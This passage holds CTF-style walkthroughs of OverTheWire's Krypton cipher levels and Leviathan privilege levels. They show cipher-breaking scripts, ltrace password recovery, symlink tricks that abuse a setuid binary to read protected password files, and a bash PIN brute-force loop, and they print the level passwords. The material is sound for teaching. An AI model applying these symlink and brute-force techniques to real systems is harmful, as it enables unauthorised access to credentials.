krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.dat
krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls
keyfile.dat
krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod <span style="color:#ae81ff">777</span> .
krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issue
krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls
ciphertext  keyfile.dat
</code></pre></div><p>So we have to figure out what&rsquo;s the rotation in this case. We should be able to do that by just encrypting the letter <code>a</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">krypton2@krypton:/krypton/krypton2$ ./encrypt 

 usage: encrypt foo  - where foo is the file containing the plaintext
</code></pre></div><p>We need to create a file. Let&rsquo;s create a temporary directory and a file containing just the letters <code>aA</code> then.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">krypton2@krypton:/krypton/krypton2$ mkdir /tmp/tempfolder
krypton2@krypton:/krypton/krypton2$ vi /tmp/tempfolder/testFile
krypton2@krypton:/krypton/krypton2$ cat /tmp/tempfolder/testFile 
aA
</code></pre></div><p>We also need to link the <code>keyfile.dat</code> to our temporary directory and then give permissions so the binary can run.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">krypton2@krypton:/krypton/krypton2$ cd /tmp/tempfolder
krypton2@krypton:/tmp/tempfolder$ ln -s /krypton/krypton2/keyfile.dat
krypton2@krypton:/tmp/tempfolder$ chmod <span style="color:#ae81ff">777</span> .
krypton2@krypton:/tmp/tempfolder$ ls -la
total <span style="color:#ae81ff">12</span>
drwxrwxrwx <span style="color:#ae81ff">2</span> krypton2 krypton2 <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">7</span> 15:30 .
drwxrwx-wt <span style="color:#ae81ff">3</span> root     root     <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">7</span> 15:32 ..
lrwxrwxrwx <span style="color:#ae81ff">1</span> krypton2 krypton2   <span style="color:#ae81ff">29</span> Jul  <span style="color:#ae81ff">7</span> 15:30 keyfile.dat -&gt; /krypton/krypton2/keyfile.dat
-rw-rw-r-- <span style="color:#ae81ff">1</span> krypton2 krypton2    <span style="color:#ae81ff">2</span> Jul  <span style="color:#ae81ff">7</span> 15:27 testFile
</code></pre></div><p>Now we just need to run the binary on the file we&rsquo;ve just created.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">krypton2@krypton:/tmp/tempfolder$ /krypton/krypton2/encrypt testFile 
krypton2@krypton:/tmp/tempfolder$ ls -la
total <span style="color:#ae81ff">16</span>
drwxrwxrwx <span style="color:#ae81ff">2</span> krypton2 krypton2 <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">7</span> 15:33 .
drwxrwx-wt <span style="color:#ae81ff">3</span> root     root     <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">7</span> 15:33 ..
-rw-rw-r-- <span style="color:#ae81ff">1</span> krypton3 krypton2    <span style="color:#ae81ff">1</span> Jul  <span style="color:#ae81ff">7</span> 15:33 ciphertext
lrwxrwxrwx <span style="color:#ae81ff">1</span> krypton2 krypton2   <span style="color:#ae81ff">29</span> Jul  <span style="color:#ae81ff">7</span> 15:30 keyfile.dat -&gt; /krypton/krypton2/keyfile.dat
-rw-rw-r-- <span style="color:#ae81ff">1</span> krypton2 krypton2    <span style="color:#ae81ff">2</span> Jul  <span style="color:#ae81ff">7</span> 15:27 testFile
</code></pre></div><p>Let&rsquo;s check the resulting <code>ciphertext</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">krypton2@krypton:/tmp/tempfolder$ cat ciphertext 
MM
</code></pre></div><p>So that tells us that it&rsquo;s rotating from <code>aA</code> to <code>MM</code>. So to decode we just have to do the other way around. Let&rsquo;s modify our previous <strong>tr</strong> command with the rotation we want.</p>
<p>We had <code>tr 'N-ZA-Mn-za-m' 'A-Za-z'</code> now what we want is to rotate from <code>M</code> to <code>A</code>. You should end up with <code>tr 'M-ZA-L' 'A-Z'</code>.</p>
<p>Let&rsquo;s try it on our file to see if we get our <code>AA</code> back. As we&rsquo;ve seen before the encryption rotates any letter to uppercase no matter what case it was originally.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">krypton2@krypton:/tmp/tempfolder$ cat ciphertext | tr <span style="color:#e6db74">&#39;M-ZA-L&#39;</span> <span style="color:#e6db74">&#39;A-Z&#39;</span>
AA
</code></pre></div><p>We got <code>AA</code> so this should be able to decrypt our initial <code>krypton3</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">krypton2@krypton:/tmp/tempfolder$ cd /krypton/krypton2/
krypton2@krypton:/krypton/krypton2$ cat krypton3 | tr <span style="color:#e6db74">&#39;M-ZA-L&#39;</span> <span style="color:#e6db74">&#39;A-Z&#39;</span>
CAESARISEASY
</code></pre></div><p>We got it. Next one.</p>
<h2 id="level-3httpoverthewireorgwargameskryptonkrypton3html"><a href="http://overthewire.org/wargames/krypton/krypton3.html">Level 3</a></h2>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>As always first check the <code>README.md</code>,</p>
<blockquote>
<p>Well done.  You&rsquo;ve moved past an easy substitution cipher.</p>
<p>Hopefully you just encrypted the alphabet a plaintext
to fully expose the key in one swoop.</p>
<p>The main weakness of a simple substitution cipher is
repeated use of a simple key.  In the previous exercise
you were able to introduce arbitrary plaintext to expose
the key.  In this example, the cipher mechanism is not
available to you, the attacker.</p>
<p>However, you have been lucky.  You have intercepted more
than one message.  The password to the next level is found
in the file &lsquo;krypton4&rsquo;.  You have also found 3 other files.
(found1, found2, found3)</p>
<p>You know the following important details:</p>
<ul>
<li>The message plaintexts are in English (*** very important)</li>
<li>They were produced from the same key (*** even better!)</li>
</ul>
<p>Enjoy.</p>
</blockquote>
<p>In this case we don&rsquo;t have access to the encryption method. I know for a fact that these types of ciphers are weak to attacks based on frequency analysis, this meaning that for example in the english language the most common letter is <code>e</code> so in the text that we have, the letter that appears the most times, SHOULD be the result of rotating <code>e</code>. And from that point we can calculate the key. Let&rsquo;s find a website that does frequency analysis of text. I found this one <a href="https://www.dcode.fr/frequency-analysis">https://www.dcode.fr/frequency-analysis</a>.</p>
<p>After pasting all of the <code>found*</code> files content we get this output on the website:</p>
<figure>
    <img src="/freq_analysis.png"/> 
</figure>

<p>So now we know that the most common letter in the text is <code>S</code> so we could assume that to decode we need to perform this rotation <code>tr 'S-ZA-R' 'E-ZA-D'</code>.</p>
<p>Let&rsquo;s try it then,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">krypton3@krypton:/krypton/krypton3$ cat krypton4 | tr <span style="color:#e6db74">&#39;S-ZA-R&#39;</span> <span style="color:#e6db74">&#39;E-ZA-D&#39;</span>
WEHHI NSEVP EHEUE HJNYZ KCGGW NZIOG MZYVE
</code></pre></div><p>Hmmm&hellip; Doesn&rsquo;t seem like it&rsquo;s correct.</p>
<p>After reading the <code>README.md</code> again i understand what i did wrong&hellip; I was assuming that this was a rotation cipher again. It&rsquo;s not it&rsquo;s substitution. So what we actually have to do is replace the most common letter in the analysis by the most common letter in the english alphabet, and so on.</p>
<p>We can use a quick python script. I got this english frequency, &ldquo;EARIOTNSLCUDPMHGBFYWKVXZJQ&rdquo;, from <a href="https://en.wikipedia.org/wiki/Letter_frequency#Relative_frequencies_of_letters_in_the_English_language">here</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">real_freq <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;EARIOTNSLCUDPMHGBFYWKVXZJQ&#34;</span>
cipher_freq <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SQJUBNCGDZVWMYTXKELAFIOHRP&#34;</span>
cipher_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS&#34;</span>
real_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#66d9ef">for</span> letter <span style="color:#f92672">in</span> cipher_text:
    <span style="color:#66d9ef">if</span> letter <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> real_freq:
        real_text <span style="color:#f92672">+=</span> letter
    <span style="color:#66d9ef">else</span>:
        real_text <span style="color:#f92672">+=</span> real_freq[cipher_freq<span style="color:#f92672">.</span>find(letter)]

<span style="color:#66d9ef">print</span> real_text
</code></pre></div><p>This should do it.</p>
<p>Spoiler alert that doesn&rsquo;t do it. In fact the frequency analysis goes deeper than this since some letters have a wrong correspondence, so you would have to do analysis of bigrams and trigrams. I started making a more advanced script but then i found a good website that does it.</p>
<p><a href="https://www.guballa.de/substitution-solver">https://www.guballa.de/substitution-solver</a></p>
<figure>
    <img src="/freq_analysis_2.png"/> 
</figure>

<p>As you can see the text makes sense even though it&rsquo;s broken into 5 characters. This should do it as our correct decryption key. We just need to change a few things in our script.</p>
<p><strong>NOTE:</strong> I worked on my own computer instead of in the normal ssh connection.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">real_alphabet <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
cipher_alphabet <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;QAZWSXEDCRFVTGBYHNUJMIKOLP&#34;</span>
cipher_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS&#34;</span>
real_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#66d9ef">for</span> letter <span style="color:#f92672">in</span> cipher_text:
    <span style="color:#66d9ef">if</span> letter <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> real_alphabet:
        real_text <span style="color:#f92672">+=</span> letter
    <span style="color:#66d9ef">else</span>:
        real_text <span style="color:#f92672">+=</span> real_alphabet[cipher_alphabet<span style="color:#f92672">.</span>find(letter)]

<span style="color:#66d9ef">print</span> real_text
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; python ~/Desktop/krypton3/simple_crack.py
WELLD ONETH ELEVE LFOUR PASSW ORDIS BRUTE
&gt;   
</code></pre></div><p>We got the password! This would be much harder if we hadn&rsquo;t find that online tool. Next one!</p>
<h2 id="level-4httpoverthewireorgwargameskryptonkrypton4html"><a href="http://overthewire.org/wargames/krypton/krypton4.html">Level 4</a></h2>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>So now we have a vigenere cipher. This kind of cipher is the result of adding the plaintext with a key, so now a character doesn&rsquo;t have a direct correspondence since it depends which character of the key was added. If you search online you will eventually understand that we can just apply the same logic as before but you have to use modulus.</p>
<p>We can use <a href="https://www.dcode.fr/vigenere-cipher">this</a>, to decode and do the analysis for us.</p>
<p>As we can see here, there are multiple possible keys, but the one that makes sense and transforms our cipher text into readable text is the first one.</p>
<figure>
    <img src="/vigenere_analysis.png"/> 
</figure>

<p>In this case our key is <code>FREKEY</code></p>
<p>So when we decrypt our encrypted text we get the following</p>
<figure>
    <img src="/vigenere_analysis_2.png"/> 
</figure>

<p>Without the spaces of course.</p>
<h2 id="level-5httpoverthewireorgwargameskryptonkrypton5html"><a href="http://overthewire.org/wargames/krypton/krypton5.html">Level 5</a></h2>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>Once again we can use the website previously mentioned.</p>
<figure>
    <img src="/krypton5.png"/> 
</figure>

<p>They suggest <code>KEYZTBGTH</code> as the key. This seems random, but if we look closer there&rsquo;s <code>KEY</code> and then ends in <code>GTH</code> it seems like <code>KEYLENGTH</code> we should try to decrypt using <code>KEYLENGTH</code> as the key.</p>
<figure>
    <img src="/krypton5_2.png"/> 
</figure>

<p>Ok we got the word <code>RANDOM</code> it can&rsquo;t be coincidence. After trying to connect, you can see that the password is right.</p>
<p>Author: <a href="https://bruno-anjos.github.io">Bruno Anjos</a>.</p>
]]></content></item><item><title>Over The Wire - Leviathan Walkthrough</title><link>/posts/otw-leviathan_walkthrough/</link><pubDate>Sun, 31 Mar 2019 00:05:08 +0000</pubDate><guid>/posts/otw-leviathan_walkthrough/</guid><description>Level 0 Arriving at Level 0 we can use ls -l to print any files, however it prints:
total 0 So we should maybe use ls -la which should print:
total 24 drwxr-xr-x 3 root root 4096 Oct 29 21:17 . drwxr-xr-x 10 root root 4096 Oct 29 21:17 .. drwxr-x--- 2 leviathan1 leviathan0 4096 Oct 29 21:17 .backup -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .</description><content type="html"><![CDATA[<h1 id="level-0">Level 0</h1>
<p>Arriving at Level 0 we can use <code>ls -l</code> to print any files, however it prints:</p>
<pre><code>total 0
</code></pre><p>So we should maybe use <code>ls -la</code> which should print:</p>
<pre><code>total 24
drwxr-xr-x  3 root       root       4096 Oct 29 21:17 .
drwxr-xr-x 10 root       root       4096 Oct 29 21:17 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Oct 29 21:17 .backup
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
</code></pre><p>Because according to <code>man ls</code>:</p>
<pre><code>-a, --all
              do not ignore entries starting with .
</code></pre><p>We <code>cd .backup &amp;&amp; ls -la</code> in order to get into the directory and print the contents and get:</p>
<pre><code>total 140
drwxr-x--- 2 leviathan1 leviathan0   4096 Oct 29 21:17 .
drwxr-xr-x 3 root       root         4096 Oct 29 21:17 ..
-rw-r----- 1 leviathan1 leviathan0 133259 Oct 29 21:17 bookmarks.html
</code></pre><p>We need to read the <code>bookmarks.html</code> and the easiest way is using <code>cat</code>, however there&rsquo;s a problem, the file is extremely long!
Time to filter it! We pipe it to <code>grep</code> and search for <code>leviathan</code> given the password should probably be referenced that way!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat bookmarks.html | grep leviathan
</code></pre></div><p>And lo and behold!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">DT</span>&gt;&lt;<span style="color:#f92672">A</span> <span style="color:#a6e22e">HREF</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m&#34;</span> <span style="color:#a6e22e">ADD_DATE</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1155384634&#34;</span> <span style="color:#a6e22e">LAST_CHARSET</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ISO-8859-1&#34;</span> <span style="color:#a6e22e">ID</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rdf:#$2wIU71&#34;</span>&gt;password to leviathan1&lt;/<span style="color:#f92672">A</span>&gt;
</code></pre></div><h1 id="level-1">Level 1</h1>
<p>Again and moving forward, our first command when we arrive to the level is <code>ls -la</code>.</p>
<p>This time the output is:</p>
<pre><code>total 28
drwxr-xr-x  2 root       root       4096 Oct 29 21:17 .
drwxr-xr-x 10 root       root       4096 Oct 29 21:17 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan2 leviathan1 7452 Oct 29 21:17 check
-rw-r--r--  1 root       root        675 May 15  2017 .profile
</code></pre><p>Uh, what is that check? Lets find out, we run <code>file</code> on it and we get back:</p>
<pre><code>check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c735f6f3a3a94adcad8407cc0fda40496fd765dd, not stripped
</code></pre><p>Since it is an executable we can first try to see what it does!
When executing it, it asks us for a password, if we fail it closes&hellip;</p>
<p>We can try to find out the string using <code>strings</code> on it, however it doesn&rsquo;t provide anything meaningful in this case.</p>
<p>Introducing <code>ltrace</code>!</p>
<pre><code>ltrace is a program that simply runs the specified command until it exits. It intercepts and records the dynamic library calls which are called by the executed process and the signals which are received by that process. It can also intercept and print the system calls executed by the program.
</code></pre><p>Let&rsquo;s try it out, run <code>ltrace ./check</code>, the program will start running as normal however you can already see a lot of information about what&rsquo;s going on.</p>
<p>Using <code>test</code> as our password the output we get from <code>ltrace</code> is this.</p>
<pre><code>__libc_start_main(0x804853b, 1, 0xffffd794, 0x8048610 &lt;unfinished ...&gt;
printf(&quot;password: &quot;)                                                                                                                                                 = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: test
)                                                                                                                                = 116
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                                                                                                = 101
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                                                                                                = 115
strcmp(&quot;tes&quot;, &quot;sex&quot;)                                                                                                                                                 = 1
puts(&quot;Wrong password, Good Bye ...&quot;Wrong password, Good Bye ...
)                                                                                                                                 = 29
+++ exited (status 0) +++
</code></pre><p>We can see it calls <code>strcmp</code> with the first 3 characters from the input password and compares them with <code>sex</code>.</p>
<p>Trying is as a password gives us another shell! Did our user changed? Running <code>whoami</code> we get the following:</p>
<pre><code>leviathan2
</code></pre><p>Uhhh! This means we can read the password for the next level!</p>
<p>Running <code>cat /etc/leviathan_pass/leviathan2</code> outputs our password!</p>
<pre><code>ougahZi8Ta
</code></pre><h1 id="level-2">Level 2</h1>
<p>This time we have <code>printfile</code>, since we have no clue what it does lets run it.</p>
<p>An empty argument list yields:</p>
<pre><code>*** File Printer ***
Usage: ./printfile filename
</code></pre><p>So we create a file on the <code>/tmp</code> folder with <code>echo &quot;test&quot; &gt;&gt; /tmp/printfile_test</code>,
so now our file contains <code>test</code> and given the executable name we are hoping to see <code>test</code> being printed out.</p>
<p>As expected <code>./printfile /tmp/printfile_test</code> prints out:</p>
<pre><code>test
</code></pre><p>Let&rsquo;s try the same, however using <code>ltrace</code>, the output is:</p>
<pre><code>__libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 &lt;unfinished ...&gt;
access(&quot;/tmp/printfile_test&quot;, 4)                                                                                                                                     = 0
snprintf(&quot;/bin/cat /tmp/printfile_test&quot;, 511, &quot;/bin/cat %s&quot;, &quot;/tmp/printfile_test&quot;)                                                                                  = 28
geteuid()                                                                                                                                                            = 12002
geteuid()                                                                                                                                                            = 12002
setreuid(12002, 12002)                                                                                                                                               = 0
system(&quot;/bin/cat /tmp/printfile_test&quot;test
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                                                                                                               = 0
+++ exited (status 0) +++
</code></pre><p>The second line <code>access(&quot;/tmp/printfile_test&quot;, 4)</code>,
checks wether the calling process can access the file.</p>
<p>As stated in the <code>access(2)</code> manpage:</p>
<blockquote>
<p><code>access()</code> checks whether the calling process can access the file <code>pathname</code>. If <code>pathname</code> is a symbolic link, it is dereferenced.</p>
<p>(&hellip;)</p>
<p>The check is done using the calling process&rsquo;s real UID and GID, rather than the effective IDs as is  done when actually attempting an operation (e.g., open(2)) on the file.</p>
</blockquote>
<p>So far we know the following:</p>
<ul>
<li><code>access</code> requires the file to exist</li>
<li>It will check the permission based on the process real UID and GID
<ul>
<li>This means that it checks if the user calling the process has the permissions and not the program itself</li>
</ul>
</li>
</ul>
<p>If we go further we can see that two calls to <code>geteuid</code> are made, both returning <code>12002</code>.
Running <code>id -u</code> we can verify that that is the ID of <code>leviathan2</code>.</p>
<p>Afterwards we can observe a call to <code>setreuid</code>, a quick look in the manpages yields the following:</p>
<blockquote>
<p>setreuid() sets real and effective user IDs of the calling process.</p>
</blockquote>
<p>This means that we have a <code>setuid</code>-like binary in hands,
and so we can&rsquo;t rely on <code>ltrace</code> to do a faithful job,
while there is a flag addressing such issue:</p>
<blockquote>
<p><code>-u username</code></p>
<p>Run command with the userid, groupid and supplementary groups of username. This option is only useful when running as root and enables the correct execution of setuid and/or setgid binaries.</p>
</blockquote>
<p>It only works for root,
so when we want to try the &ldquo;final&rdquo; version we will always run without <code>ltrace</code>,
this applies for further levels as well.</p>
<p>Finally there is a call to <code>system</code>:</p>
<pre><code>system(&quot;/bin/cat /tmp/printfile_test&quot;)
</code></pre><p>This call will be executed with the priviledges set by <code>setreuid</code> and while when running with <code>ltrace</code>
they are the same as the current level it is possible to think that without it,
it is probably a more usefull call.</p>
<p>This opens up a security hole given that the priviledges being checked with <code>access</code>
are not the same as the ones when calling <code>system</code>.
Furthermore the use of <code>%s</code> in <code>snprintf</code> means that
we have control of the input over the command being run.</p>
<p>Ideally we want to run the following command:</p>
<pre><code>cat /etc/leviathan_pass/leviathan3
</code></pre><p>However we do not have access to <code>/etc/leviathan_pass/leviathan3</code>,
to any symbolic links given that they resolve to the file anyway,
neither we can create a file called <code>test /etc/leviathan_pass/leviathan3</code>.</p>
<p>However we can create one called <code>test link</code>, and then run <code>printfile &quot;test link&quot;</code>.
This won&rsquo;t be very useful unless either <code>test</code> or <code>link</code> are symbolic links to <code>/etc/leviathan_pass/leviathan3</code>.
To do so, we run</p>
<pre><code>touch &quot;test link&quot;
ln -s /etc/leviathan_pass/leviathan3 link
~/printfile &quot;test link&quot;
</code></pre><p>Which will create the dummy file for the <code>printfile</code> to take and check access over,
create a symbolic link to <code>/etc/leviathan_pass/leviathan3</code> named <code>link</code>
and finally run <code>~/printfile &quot;test link&quot;</code> yielding:</p>
<pre><code>/bin/cat: test: No such file or directory
Ahdiemoo1j
</code></pre><p>And there is our password!</p>
<h1 id="level-3">Level 3</h1>
<p>Going into Level 3,
we have yet another password challenge,
running the <code>level3</code> executable shows us a prompt for a password.</p>
<pre><code>leviathan3@leviathan:~$ ./level3 
Enter the password&gt; password
bzzzzzzzzap. WRONG
</code></pre><p>We grab our old friend <code>ltrace</code> and run <code>ltrace ./level3</code>, the following ensues.</p>
<pre><code>__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 &lt;unfinished ...&gt;
strcmp(&quot;h0no33&quot;, &quot;kakaka&quot;)                                                        = -1
printf(&quot;Enter the password&gt; &quot;)                                                    = 20
fgets(Enter the password&gt; password
&quot;password\n&quot;, 256, 0xf7fc55a0)                                              = 0xffffd590
strcmp(&quot;password\n&quot;, &quot;snlprintf\n&quot;)                                               = -1
puts(&quot;bzzzzzzzzap. WRONG&quot;bzzzzzzzzap. WRONG
)                                                        = 19
+++ exited (status 0) +++
</code></pre><p>While in the second line we have a clearly false comparison,
after <code>fgets</code> we see our input being compared to <code>snlprintf</code>,
so we try again with <code>snlprintf</code> as input.</p>
<pre><code>__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 &lt;unfinished ...&gt;
strcmp(&quot;h0no33&quot;, &quot;kakaka&quot;)                                                        = -1
printf(&quot;Enter the password&gt; &quot;)                                                    = 20
fgets(Enter the password&gt; snlprintf
&quot;snlprintf\n&quot;, 256, 0xf7fc55a0)                                             = 0xffffd590
strcmp(&quot;snlprintf\n&quot;, &quot;snlprintf\n&quot;)                                              = 0
puts(&quot;[You've got shell]!&quot;[You've got shell]!
)                                                       = 20
geteuid()                                                                         = 12003
geteuid()                                                                         = 12003
setreuid(12003, 12003)                                                            = 0
system(&quot;/bin/sh&quot;$ whoami
leviathan3
$ exit
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                            = 0
+++ exited (status 0) +++
</code></pre><p>This got us shell!
However when running with <code>ltrace</code> the program runs within the <code>leviathan3</code> user.
Ditching <code>ltrace</code> and running the executable alone gives us the following result.</p>
<pre><code>/level3 
Enter the password&gt; snlprintf
[You've got shell]!
$ whoami
leviathan4
</code></pre><p>Meaning we can get the password for Level 4.</p>
<pre><code>$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
</code></pre><p>Ta-daaaaa!</p>
<h1 id="level-4">Level 4</h1>
<p>Running <code>ls -la</code> so that nothing escapes our grasp shows the following.</p>
<pre><code>total 24
drwxr-xr-x  3 root root       4096 Oct 29  2018 .
drwxr-xr-x 10 root root       4096 Oct 29  2018 ..
-rw-r--r--  1 root root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root root        675 May 15  2017 .profile
dr-xr-x---  2 root leviathan4 4096 Oct 29  2018 .trash
</code></pre><p>Diving in the <code>.trash</code> we find the executable <code>bin</code>.
Running it prints the following output.</p>
<pre><code>01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
</code></pre><p>Passing it through a binary to ascii converter gives us the password to the next level - <code>Tith4cokei</code>.</p>
<h1 id="level-5">Level 5</h1>
<p>Running the same routine we find.</p>
<pre><code>total 28
drwxr-xr-x  2 root       root       4096 Oct 29  2018 .
drwxr-xr-x 10 root       root       4096 Oct 29  2018 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 7560 Oct 29  2018 leviathan5
-rw-r--r--  1 root       root        675 May 15  2017 .profile
</code></pre><p>And running <code>./leviathan5</code> yields.</p>
<pre><code>Cannot find /tmp/file.log
</code></pre><p>Maybe we can do another symbolic link!</p>
<p>We run <code>ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log</code> to create it
and afterwards we run the executable.</p>
<pre><code>leviathan5@leviathan:~$ ./leviathan5 
UgaoFee4li
</code></pre><p>Easy peasy, lemon squeezy.</p>
<h1 id="level-6">Level 6</h1>
<p>In Level 6 we have a PIN protected executable, given we need a 4 digit-code we can brute force it!</p>
<p>Using the power of <code>bash</code> we brew a script, dead simple, yet powerfull!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">for</span> a in <span style="color:#f92672">{</span>0..9<span style="color:#f92672">}</span>
<span style="color:#66d9ef">do</span>
  <span style="color:#66d9ef">for</span> b in <span style="color:#f92672">{</span>0..9<span style="color:#f92672">}</span>
  <span style="color:#66d9ef">do</span>
    <span style="color:#66d9ef">for</span> c in <span style="color:#f92672">{</span>0..9<span style="color:#f92672">}</span>
    <span style="color:#66d9ef">do</span>
      <span style="color:#66d9ef">for</span> d in <span style="color:#f92672">{</span>0..9<span style="color:#f92672">}</span>
      <span style="color:#66d9ef">do</span>
        echo <span style="color:#e6db74">&#34;</span>$a$b$c$d<span style="color:#e6db74">&#34;</span>
        ~/leviathan6 <span style="color:#e6db74">&#34;</span>$a$b$c$d<span style="color:#e6db74">&#34;</span>
      <span style="color:#66d9ef">done</span>
    <span style="color:#66d9ef">done</span>
  <span style="color:#66d9ef">done</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><p>This will brute force the password and print the codes while doing it!</p>
<p>We do the following and wait.</p>
<pre><code>chmod a+x script.sh
./script
</code></pre><p>It will stop when the right password was reached, after a long list of numbers and wrongs.</p>
<pre><code>Wrong
7120
Wrong
7121
Wrong
7122
Wrong
7123
$ whoami
leviathan7
</code></pre><p>Voilá!</p>
<p>Now we just <code>cat</code> the password, when we exit the shell the script will continue running,
there is no point to it, so you can just <code>Ctrl-C</code> to kill it.</p>
<pre><code>$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
</code></pre><h1 id="level-7">Level 7</h1>
<p>You did it!</p>
<p>If you enjoyed reading this walkthrough, have comments or fixes on it,
send us an <a href="mailto:cibersegurancafct@gmail.com">email</a>.
Author: <a href="https://jmg-duarte.github.io/">José Duarte</a>.</p>
]]></content></item></channel></rss>